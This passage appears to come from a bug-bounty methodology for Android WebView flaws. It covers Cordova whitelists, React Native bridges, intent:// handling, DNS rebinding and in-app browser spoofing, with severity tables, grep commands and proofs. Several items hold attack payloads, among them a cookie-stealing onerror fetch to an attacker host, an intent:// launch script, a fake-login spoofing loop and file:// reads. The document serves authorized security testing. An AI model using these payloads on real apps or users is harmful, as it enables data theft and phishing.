  fetch('file:///data/data/<pkg>/shared_prefs/prefs.xml').then(r=>r.text()).then(console.log);
  fetch('https://internal.target.local/').then(r=>r.text()).then(console.log);   // no CORS
  ```
- **Proof:** `<preference name="AndroidInsecureFileModeEnabled" value="true"/>` plus a successful `file://` read and a
  cross-origin read from the page.
- **Escalation:** With any HTML injection it is total local data disclosure plus a CORS-free proxy → D11/D13/D22.
- **Ruled out when:** the app uses the secure default `https://localhost` scheme and the preference is absent/false.

### D10-060 · Cordova `<allow-navigation href="*">` / `<access origin="*">` + missing CSP

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | precondition for bridge access — rate on the bridge PoC (P1) |
| **Attacker** | AM-02 |
| **Applies to** | Cordova / Ionic-on-Cordova |
| **Maps to** | Cordova `WhitelistPlugin.java` (`"*"` on allow-navigation expands to `http://*/*`,`https://*/*` **and `data:*`**); Cordova whitelist docs ("cannot block redirects from whitelisted remote sites") |

- **Test:** `<allow-navigation href="*">` lets the WebView top-level navigate anywhere including `data:`;
  `<access origin="*">` lets it fetch anything. Neither can stop a redirect chain. With no CSP, any injection or
  open-redirect becomes bridge access.
- **How:**
  ```bash
  grep -nE '<allow-navigation|<allow-intent|<access ' out/res/xml/config.xml
  grep -n 'Content-Security-Policy' out/assets/www/index.html
  ```
- **Proof:** `<allow-navigation href="*"/>` present and no CSP meta tag; navigate to
  `data:text/html,<script>alert(typeof _cordovaNative)</script>` and observe the bridge being defined. Report with the
  bridge PoC attached, not as a config nit.
- **Escalation:** → D10-058 `_cordovaNative` exec.
- **Ruled out when:** `allow-navigation`/`access` list only exact first-party origins and a CSP without
  `unsafe-inline`/`unsafe-eval`/`default-src *` is enforced.

### D10-061 · React Native `ReactNativeWebView` bridge + re-enabled file-access props

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when `onMessage` routes into a privileged native module; else token/file paths |
| **Attacker** | AM-02 |
| **Applies to** | React Native apps using `react-native-webview` |
| **Maps to** | `RNCWebView.java` (`JAVASCRIPT_INTERFACE="ReactNativeWebView"`, `injectedObjectJson`), `RNCWebViewManager.kt` (defaults `setSupportMultipleWindows(true)`, `allowUniversalAccessFromFileURLs=false`) |

- **Test:** `react-native-webview` installs a `ReactNativeWebView` interface with `postMessage`, and exposes props that
  re-enable dangerous settings. Check which props the app sets and whether `onMessage` routes into a privileged module.
- **How:**
  ```bash
  for p in allowFileAccess allowUniversalAccessFromFileURLs mixedContentMode originWhitelist injectedJavaScript injectedJavaScriptObject javaScriptEnabled; do echo "== $p"; grep -a -c "$p" hbc.strings; done
  ```
  ```javascript
  typeof window.ReactNativeWebView;
  window.ReactNativeWebView.postMessage(JSON.stringify({type:'auth',x:1}));  // reaches onMessage
  window.ReactNativeWebView.injectedObjectJson();                            // returns injectedJavaScriptObject (may hold a token)
  ```
- **Proof:** `onMessage` in the JS bundle consuming the posted string without validation and dispatching by a `type`
  field into native module calls; or `injectedObjectJson()` returning a token.
- **Escalation:** `postMessage` → RN native module → D06/D11/D12; the finding is the app **overriding**
  `allowUniversalAccessFromFileURLs` to `true` (safe default is false).
- **Ruled out when:** `onMessage` validates and does not route into privileged modules, `injectedJavaScriptObject`
  carries no secret, file-access props are left at their safe defaults, and the WebView loads only trusted content.

### D10-062 · Cordova-Android < 4.1.1 whitelist redirect bypass / config injection (LEGACY)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | plugin access from an attacker origin → P1-class device/file access |
| **Attacker** | AM-02 / AM-06 |
| **Applies to** | LEGACY — Cordova-Android < 4.1.1 (< 4.0.2 for config-via-Intent) |
| **Maps to** | CVE-2015-5256, CVE-2015-1835, CVE-2014-3502, CVE-2014-3500; Google "How to fix apps with Apache Cordova vulnerabilities" |

- **Test:** Fingerprint the Cordova-Android version. Below 4.1.1 the whitelist cannot stop a redirect from a
  whitelisted origin to an attacker origin; below 4.0.2 config variables are settable via Intent.
- **How:**
  ```bash
  unzip -p target.apk assets/www/cordova.js | grep -m3 -iE "PLATFORM_VERSION_BUILD_LABEL|cordova.version|CORDOVA_JS_BUILD_LABEL"
  unzip -p target.apk res/xml/config.xml | grep -iE '<allow-navigation|<access origin'
  ```
  From a whitelisted origin you can influence (or via MitM), issue a 302 to `https://attacker.tld/` and see whether the
  WebView follows it and retains bridge access.
- **Proof:** The Cordova version string, plus a WebView that lands on the attacker origin and can still invoke a plugin
  (`cordova.exec(...)` returning a real value — e.g. the File plugin listing app dirs).
- **Escalation:** Plugin bridge → file/camera/contacts (D07/D11/D20); combine with D19.
- **Ruled out when:** Cordova-Android ≥ 4.1.1 and the whitelist is not wildcarded — verify the version string, do not
  assume from the app's build date.

### D10-063 · CSP not enforced in the in-app browser (response header vs `<meta>`)

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `cross_site_scripting_xss.*` on visited content; higher when it reaches a wallet/bridge action |
| **Attacker** | AM-02 |
| **Applies to** | any app shipping a browser or in-app WebView for third-party content |
| **Maps to** | H1 #1941767 (MetaMask, Medium 4.7); Cordova/Capacitor CSP guidance |

- **Test:** An app's embedded browser that ignores the CSP *header* (while honouring the `<meta>` tag) silently removes
  the last line of defence for every site the user visits. Root cause is often request-handling code that strips
  headers while injecting a provider script.
- **How:** Host two pages — one setting CSP via `<meta http-equiv="Content-Security-Policy" content="script-src 'none'">`,
  one via the HTTP header — each with an inline `<script>alert(1)</script>`. Load both in the app's browser and in Chrome.
  ```bash
  grep -n 'Content-Security-Policy' out/assets/www/index.html out/assets/public/index.html 2>/dev/null
  ```
- **Proof:** Chrome blocks both; the app's browser blocks the `<meta>` page but executes on the header page.
- **Escalation:** In MetaMask's browser the XSS could call `window.ethereum` and invoke a transaction on a connected
  wallet → D23; general phishing otherwise.
- **Ruled out when:** the in-app browser honours CSP response headers (does not strip them) and does not inject
  privileged scripts into third-party pages.

### D10-064 · CDN- or remote-served asset loaded into a bridged WebView (supply chain)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the bridge exposes token/file/financial actions |
| **Attacker** | AM-09 (malicious backend/CDN, subdomain takeover, stale bucket) |
| **Applies to** | all apps loading remote HTML/JS into a bridged WebView |
| **Maps to** | `risks/insecure-webview-native-bridges`, `risks/unsafe-uri-loading` (gap-coverage corpus) |

- **Test:** A WebView that loads remote HTML/JS from a CDN (help centre, promo, terms, campaign) **and** has
  `addJavascriptInterface`/`addWebMessageListener` registered gives a CDN compromise, stale bucket, subdomain takeover
  or compromised CMS direct bridge access.
- **How:**
  ```bash
  grep -rnE 'loadUrl\(|loadDataWithBaseURL\(|WebViewAssetLoader' jadx_out/sources -A4 | grep -oE 'https?://[^"]+'
  grep -rnE 'addJavascriptInterface|addWebMessageListener|@JavascriptInterface|postWebMessage' jadx_out/sources -B4
  for H in $(hosts from above); do dig +short "$H"; curl -sI "https://$H/" | head -1; done   # still owned?
  ```
  Then MitM one asset (system-CA harness) and replace it with a page that calls every bridge method.
- **Proof:** The bridge method executing from the substituted asset — return value on screen/logged — with the
  Burp/mitmproxy flow showing your body served for that CDN URL; or a demonstrated subdomain takeover of a loaded host.
- **Escalation:** → D18 (which CDN/bucket, who controls it) → a standalone subdomain-takeover finding → D10-004.
- **Ruled out when:** the WebView loads only local content via `WebViewAssetLoader`, or every remote origin it loads is
  owned/pinned and no bridge is attached while remote content is loaded.

### D10-065 · `intent://` handling in `shouldOverrideUrlLoading` → arbitrary activity launch / redirection

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null, rated on what it reaches) → P1-class when it reaches a private component/file grant |
| **Attacker** | AM-02 (web content already in the WebView) |
| **Applies to** | any WebView not hard-blocking non-`http(s)` schemes in `shouldOverrideUrlLoading` |
| **Maps to** | local corpus Class #19; `risks/unsafe-uri-loading`, `risks/intent-redirection`; gap-adversary "web content reaching Intent.parseUri" |

- **Test:** The handler does `Intent.parseUri(url, 0)` + `startActivity` without resetting component/selector, so **web
  content already loaded in the app's WebView** (an allow-listed CDN, an ad frame, an OAuth page) can navigate to
  `intent://` and make the app launch non-exported same-app activities — with the app's UID, no other app involved.
- **How:**
  ```bash
  grep -rn 'shouldOverrideUrlLoading' jadx_out/sources -A20 | grep -nE 'parseUri|startActivity'
  ```
  From a page the WebView loads:
  ```html
  <script>location = "intent://x/#Intent;component=com.target/.InternalSettingsActivity;S.debugFlag=1;end";</script>
  ```
  The `SEL` selector to force an unexpected action is honoured by WebView and Firefox but blocked by Chrome.
- **Proof:** The non-exported activity resuming (`dumpsys activity activities | grep mResumedActivity`) with the
  WebView's page URL being the attacker origin in the same capture.
- **Escalation:** Combine with D08 grant flags to convert a web visit into a file read; pure remote-web path to
  non-exported components (D04/D08).
- **Ruled out when:** the handler calls `setComponent(null); setSelector(null)` and verifies the target is
  exported/permitted before `startActivity`, or hard-blocks non-`http(s)` schemes.

### D10-066 · Ad / analytics SDK WebView with a JS interface reachable over cleartext

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) on minSdk<17; else `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-06 (network) / AM-08 (malicious SDK) |
| **Applies to** | apps bundling ad/analytics SDK WebViews; cleartext blocked by default only when targetSdk ≥ 28 with no override |
| **Maps to** | Google ASI "JavaScript Interface Injection" (2018-12-04); FireEye JS-Binding-Over-HTTP ("47% of top 40 ad libraries") |

- **Test:** An SDK WebView that both registers a JS interface and loads content over HTTP is remotely controllable by a
  network attacker; on minSdk<17 the reflection path is direct RCE.
- **How:**
  ```bash
  grep -rn "addJavascriptInterface\|@JavascriptInterface" out/sources/ | grep -viE "^out/sources/(android|androidx)/"
  grep -rn "loadUrl(\"http://\|loadUrl('http://" out/sources/
  grep -n 'usesCleartextTraffic\|networkSecurityConfig' out/AndroidManifest.xml ; cat out/res/xml/network_security_config.xml 2>/dev/null
  ```
  MitM the SDK's creative host and inject a page that enumerates and calls the bridge.
- **Proof:** `adb logcat | grep chromium` showing your injected `console.log` naming the bridge, plus a bridge method
  returning a real value captured in Burp as the exfil request you triggered.
- **Escalation:** Bridge file read → D11; bridge intent launch → D08; minSdk<17 → D10-005 RCE.
- **Ruled out when:** the SDK WebView loads only HTTPS, or targetSdk ≥ 28 with no cleartext override, and the interface
  exposes no sensitive methods.

### D10-067 · Support-chat SDK WebView rendering agent-/bot-supplied HTML

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2); Critical when it reaches a bridge |
| **Attacker** | AM-05 / AM-09 (agent side, bot template, another marketplace user) |
| **Applies to** | all apps with embedded support chat |
| **Maps to** | no external identifier verified (gap-coverage corpus); Zendesk/Intercom/Freshchat/Salesforce/Helpshift |

- **Test:** Support-chat SDKs render conversation content in a WebView and many expose a bridge for "actions" and file
  previews. The content comes from the agent side, a bot template, or another user. Test whether message bodies, quick
  replies, article previews or attachment previews execute script and whether a bridge is reachable.
- **How:**
  ```bash
  grep -rnE 'zendesk|intercom|freshchat|helpshift|salesforce.*messaging' -il jadx_out/sources | head
  grep -rnE 'addJavascriptInterface|setJavaScriptEnabled\(true\)|loadDataWithBaseURL' jadx_out/sources | grep -iE 'zendesk|intercom|freshchat|helpshift|support|chat'
  ```
  From the agent console (or by replaying the send-message API as the peer): send
  `<img src=x onerror="fetch('https://attacker/'+document.cookie)">` and `<img src=x onerror="alert(Object.keys(window))">`.
- **Proof:** The payload executes in the chat WebView (screen-record the alert / outbound fetch) and
  `Object.keys(window)` lists an app-injected object name.
- **Escalation:** Any reachable bridge method → D10-004.
- **Ruled out when:** the chat SDK HTML-escapes agent/bot content, renders with JS disabled, and exposes no bridge with
  app cookies present.

### D10-068 · In-app browser URL / origin spoofing (calibration)

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | content/UI spoofing — most programs discount heavily; High only when a signing/payment prompt misattributes the request |
| **Attacker** | AM-02 |
| **Applies to** | all apps with an in-app browser showing a URL |
| **Maps to** | H1 #1751333 (MetaMask, High 7.1 — stale origin on a transaction prompt); #175958, #176929 ($0), #1082991 ($0), #2501378 ($0) |

- **Test:** Whether the displayed URL and the rendering origin can diverge — a redirect the address bar does not follow,
  or a `setInterval`/`history.pushState` location loop.
- **How:**
  ```html
  <body><form>...fake login...</form><script>setInterval(function(){location="https://facebook.com"},10)</script></body>
  ```
  For the redirect variant: navigate from a trusted site to an attacker site and check whether the tab's domain updates.
- **Proof:** A screenshot/video with a trusted hostname (and padlock) in the chrome while attacker content renders and
  your server logs the fetch.
- **Escalation:** Run the pre-severity gate against the CRITICAL claim, not the bug: spoofing alone pays $0 across the
  board; spoofing that changes what a *signing or payment prompt attributes the request to* pays High (MetaMask #1751333) → D23.
- **Ruled out when:** the address bar tracks the true rendering origin through redirects and script-driven navigations —
  and, per the empirical record, do not file plain address-bar spoofing without a consequence to a signing/payment
  attribution.

### D10-069 · DNS rebinding against the app's embedded localhost HTTP/WebSocket server

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | rated on what the endpoint exposes; Critical when it accepts a command reaching code execution / file write |
| **Attacker** | AM-02 (any browser page on the phone) |
| **Applies to** | apps running a loopback server (NanoHTTPD, Cordova/Ionic, a stray RN dev server, a Flutter/Unity asset server, QR-pairing) |
| **Maps to** | `risks/bad-dns` (Insecure DNS Setup) — closest published slug (gap-adversary corpus) |

- **Test:** A loopback server is not protected by SOP: a web page the victim visits in any browser on the phone can be
  pointed at `http://127.0.0.1:<port>/` via a rebinding name, and everything that server exposes becomes web-reachable.
- **How:**
  ```bash
  adb shell ss -ltnp 2>/dev/null                       # find the listener
  adb shell dumpsys package com.target | grep userId=  # attribute the socket
  grep -rnE 'NanoHTTPD|ServerSocket\(|HttpServer|Ktor|embeddedServer|WebSocketServer|:8080|:8081' jadx_out/sources
  ```
  Serve a page from your domain (DNS TTL 1s) that flips the A-record to 127.0.0.1 after first load, then `fetch('/')`.
- **Proof:** The response body of the app's localhost endpoint rendered inside a browser tab whose origin is your
  domain — screenshot the URL bar and body together; `adb logcat` showing the app served it completes it.
- **Escalation:** → D19 if it is a framework dev server (hot-reload = arbitrary JS); → D16 if it parses attacker bytes
  natively.
- **Ruled out when:** no loopback listener exists, or the server enforces an `Origin`/`Host` allow-list and a
  per-connection token that a rebound origin cannot supply.

### D10-070 · Custom Tabs navigation-callback cross-site login oracle (web-side finding)

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | cross-site state inference — file against the *website* scope, not the app |
| **Attacker** | AM-03 (any installed app, no permissions, no interaction) |
| **Applies to** | any target website whose in-scope users have its cookie in a Chromium-based Android browser |
| **Maps to** | SecWeb 2022 "The Bridge... is Still Broken" §IV (first known attack on Android CustomTabs) |

- **Test:** A malicious app launches a target site in a Custom Tab (which shares the browser cookie jar) and reads the
  sequence/timing of `CustomTabsCallback` navigation events to infer the victim's state without reading the response —
  status-code (4xx empty body fires `NAVIGATION_FAILED`+`FINISHED`, 200 does not), redirect (auth'd `/login`→`/home`
  fires two `NAVIGATION_STARTED`/`FINISHED`), and timing (baselined against a hidden WebView, which shares no state).
- **How:** Build a PoC app registering a `CustomTabsCallback`, load the target URL, and classify the event
  sequence/timing; baseline the timing against the same URL in a hidden WebView.
- **Proof:** A PoC app that reliably reports "victim is logged into example.com" purely from callback sequence/timing,
  verified by logging in/out of the target in the device browser.
- **Escalation:** Combine with D09 to deanonymise a victim; the paper notes it opens history-sniffing doors. Trusted
  Web Activities inherit the state-sharing but do not support `postMessage`.
- **Ruled out when:** the target site does not distinguish authenticated vs unauthenticated by status/redirect/timing
  on the probed endpoints — this is a web-side finding delivered through a mobile primitive.

### D10-071 · Predictive back inside WebView escaping the app's history guard (targetSdk 36)

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | broken flow control; High if it leaves an inconsistent server-side state an attacker exploits |
| **Attacker** | AM-11 (physical/unlocked) / AM-05 |
| **Applies to** | targetSdk 36+ WebView flows relying on `onBackPressed()`→`webView.goBack()` |
| **Maps to** | `about/versions/16/behavior-changes-16`; `guide/navigation/custom-back/predictive-back-gesture` (WebView codelab) |

- **Test:** With predictive back default-on at targetSdk 36, a WebView-hosted flow that relied on `onBackPressed()` to
  intercept and call `webView.goBack()` (or to block leaving a payment page) loses the interception.
- **How:**
  ```bash
  grep -rn 'goBack()\|canGoBack()\|onBackPressed' jadx_out/sources
  ```
  On Android 16, drive a multi-step WebView flow and swipe back.
- **Proof:** The activity finishes instead of stepping back in WebView history, or the user leaves a half-completed
  transaction with server-side state already mutated.
- **Escalation:** → D15 state-machine abuse if the abandoned server state is exploitable.
- **Ruled out when:** the flow migrated to the `OnBackPressedCallback`/`OnBackInvokedCallback` API and correctly steps
  WebView history (or the app targets < 36), and no server-side state is left inconsistent.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| `addJavascriptInterface` is used somewhere in the app | The bridge existing is not the finding; on API 17+ only annotated methods are reachable | An annotated method that returns a credential/file/native action, reachable from attacker content (D10-004) |
| `setWebContentsDebuggingEnabled(true)` guarded by `BuildConfig.DEBUG` | Not present in the release build; a debug-only switch | Prove the socket exists on a **release-signed, non-debuggable** build (D10-049) |
| `setAllowContentAccess(true)` (the default) with no JS-injection vector | MASTG: content access alone is not a vulnerability | A demonstrated JS-injection vector that reaches a private `content://` provider (D10-033) |
| `MIXED_CONTENT_ALWAYS_ALLOW` / Safe Browsing off with no reachable untrusted origin | P5 misconfiguration; removed defence-in-depth only | An injected HTTP subresource executing script in the HTTPS origin (D10-040), or the WebView loading a known-malicious URL with no interstitial + weak validation (D10-052) |
| Address-bar spoofing in an in-app browser | Content/UI spoofing pays $0 empirically across Brave/MetaMask/LINE | Spoofing that changes what a signing/payment prompt attributes the request to (D10-068 → D23) |
| Self-XSS in a WebView (victim pastes your payload) | HackerOne Core Ineligible: self-exploitation; `stored.self` is P5 | Cross-user delivery: stored, or via a deep link another user opens (D10-027) |
| Native→JS string concatenation where the value is app/server-internal | Not attacker-controlled — a defence-in-depth nit (Meesho's were) | A data-flow path from a deep-link/IPC/provider/profile source into the concatenated string (D10-025) |
| `setForceDark`/`prefers-color-scheme` reflecting the app theme to web content | A single fingerprint bit; no confidentiality impact | The theme encodes a privacy-relevant mode (e.g. "incognito") and it is part of a fingerprinting finding (→ D20) |
| A bridge finding dismissed as "the renderer is sandboxed" | The renderer isolates web content; the `@JavascriptInterface` object runs in the app process with the app UID | `ps -Z` showing `webview_zygote`/`:sandboxed_process` under an isolated UID while the app PID (running the bridge) is `u0_aNNN` — keeps the bridge finding rated correctly |
| "MitM inject JS into an `http://` WebView" with no stated reachability | Not reproducible on targetSdk ≥ 28 without a precondition | An NSC cleartext domain, an `http://` load path, or an existing XSS on the loaded origin (D10-041) |

## Cross-surface joins

- **D09 (deep links) × D10 (bridge):** the single highest-yield join in mobile. A deep link whose `url=`/`web_view_url=`
  parameter reaches `loadUrl` on a bridged WebView is the delivery half; the token-returning bridge is the payload half.
  Neither is filed alone — file the deep-link primitive first (its id exists), then the bridge finding as the consumer,
  then backfill the link. One fix = one bounty; the chain is a severity amplifier, not a merge request.
- **D08 (intent redirection) × D10:** `intent://` in `shouldOverrideUrlLoading` (D10-065) turns web content already in
  the WebView into the local intent-redirection primitive — a pure remote-web path to non-exported components, with no
  malicious app. Conversely, an exported activity that forwards a `url` extra into a WebView (D08) is the redirection
  half of a WebView XSS/token-theft chain.
- **D10 (bridge/UXSS token) × D15 (backend) — the Shadow-API join:** a bridge or `loadDataWithBaseURL` UXSS that lifts a
  session token is only Informational until you replay it. The mobile app's hardcoded backend is frequently an *older*
  API version than the web app uses, with weaker auth, weaker rate limits and more field exposure — diff its
  *behaviour*, not its response shape; the weakened control (not the version difference) is the escalation finding.
  Remember the layer-ordering trap when you replay: a 400 "field X required" from the token'd request does not prove
  auth passed — re-test with a minimal well-formed body before claiming a bypass.
- **D07 (ContentProvider) × D10:** `setAllowContentAccess` + a JS foothold reads the app's own **non-exported**
  providers from the WebView (D10-033); and a stateful malicious `content://` provider is the source of second-order
  WebView XSS via `DISPLAY_NAME` (D10-028). Nobody reviews the provider export table and the WebView content-access
  setting together — the join is a private-provider read with no exported component.
- **D11/D12 (storage/keystore) × D10:** universal file access, `shouldInterceptRequest` traversal, the file-chooser
  and the cookie-DB symlink (D10-031/-034/-037/-038) each read exactly what D11/D12 measured as sensitive; and eternal
  WebView cookies (D10-046) are the artifact those primitives exfiltrate. The bridge file-read reaches Keystore-wrapped
  blobs and their IVs even when the renderer looks locked down.
- **D14 (TLS) × D10:** `onReceivedSslError→proceed()` and `MIXED_CONTENT_ALWAYS_ALLOW` (D10-039/-040) give a network
  attacker script injection into the WebView origin, which is the delivery vehicle for every bridge/token item above —
  the two surfaces are usually audited by different testers.
- **D18 (secrets/infra) × D10:** a bridged WebView loading remote HTML from a CDN/bucket (D10-064) makes a subdomain
  takeover or stale bucket a direct bridge-access primitive — file the takeover against infra, then the bridge as the
  consumer.
- **D28 (OAuth) × D10:** OAuth run in an embedded WebView instead of a Custom Tab, plus third-party cookies
  (D10-044) or the targetSdk-31 SameSite regression (D10-045), converts into session fixation / code interception —
  the WebView-vs-Custom-Tab classifier (D10-021) is the same bug from the routing side.

## Sources

- Local senior-researcher corpus (`local/skill-corpus-classes.md`, `skill-corpus-method.md`): the WebView-layer
  mapping, the single-validator model, the four residual patterns (main-frame-only iframe, sibling path, un-re-checked
  variant, string-concat), the concrete-`ContentSettingsAdapter` hooking trap, the Meesho `xoox`/`C1535g` bridge diff,
  and the corrected per-`targetSdk` defaults.
- OWASP MASTG/MASWE (`primary/owasp-mastg.md`, `owasp-mobile-top10.md`): MASTG-TEST-0334/-0250/-0251/-0252/-0253/-0398/
  -0400/-0399/-0284/-0320/-0227, MASWE-0033/-0034/-0035/-0027/-0063/-0001, MASTG-KNOW-0018 defaults table,
  MASTG-DEMO-0030 Frida enumeration, the CORS negative-control logcat lines, MASTG-TECH-0142/-0143.
- Android developer risk docs (`architecture/*`, `frontier/*`): `insecure-webview-native-bridges` (every-frame injection,
  `postWebMessage("*")`, `addWebMessageListener` wildcard), `webview-unsafe-file-inclusion`, `unsafe-uri-loading`,
  `cross-app-scripting`, `unsafe-trustmanager`, Credential-Manager-in-WebView, the targetSdk-31 SameSite and targetSdk-33
  `setForceDark`/targetSdk-36 predictive-back behaviour changes.
- Disclosed reports (`realworld/*`): H1 #401793, #1343300, #1500614, #2417516 (CVE-2024-45240), #1065500, #906433
  (CVE-2020-6506), #3475626, #532836/#288955, #499348, #283063/#283058, #176065, #297547, #189793, #1941767, #1751333,
  #1011956; KuCoin `HybridJsInterface`, Amazon `LocalAssetHandler`, Oversecured WebView/WebResourceResponse/file-theft
  checklists.
- Cross-platform framework research (`realworld/crossplatform-frameworks.md`): Capacitor `/_capacitor_file_`,
  `/_capacitor_http_interceptor_` and `androidBridge.postMessage`; Cordova `_cordovaNative`/`gap:` secret gate,
  `AndroidInsecureFileModeEnabled`, whitelist wildcards; `react-native-webview` `ReactNativeWebView`; SecWeb 2022 "The
  Bridge... is Still Broken" (media auto-grant, Custom Tabs oracle).
- Exploit-DB / CVE patterns (`primary/exploitdb-cve-patterns.md`, `realworld/sdk-supplychain-cves.md`): CVE-2012-6636,
  CVE-2013-4710, CVE-2014-0514, CVE-2014-4968, CVE-2010-4804, CVE-2015-7893, CVE-2017-17692, CVE-2015-5256/-1835/
  CVE-2014-3500/-3502; drozer `addjavascriptinterface`; Google ASI campaign catalogue; FireEye JS-Binding-Over-HTTP.
- Tooling (`secondary/frida-drozer-tooling.md`): `Java.choose`/`ContentSettingsAdapter` correctness item, objection
  `android heap` verbs, `WebViewClient.onReceivedSslError` runtime hook.
- Bugcrowd VRT 2026-07-08 and program economics (`primary/bugcrowd-vrt-severity.md`, `vrp-program-economics.md`,
  `secondary/claude-bughunter.md`): the P1 landing categories, the P5 mobile-branch fallbacks, the self-XSS/spoofing
  graveyard calibration, and the evidence-hygiene / shadow-API / chain-filing discipline applied throughout.
- Gap analyses (`gaps-*.md`): `setDownloadListener`, `setAcceptThirdPartyCookies`, support-chat SDK WebViews, DNS
  rebinding against the embedded localhost server, and web-content-reaching-`Intent.parseUri`.
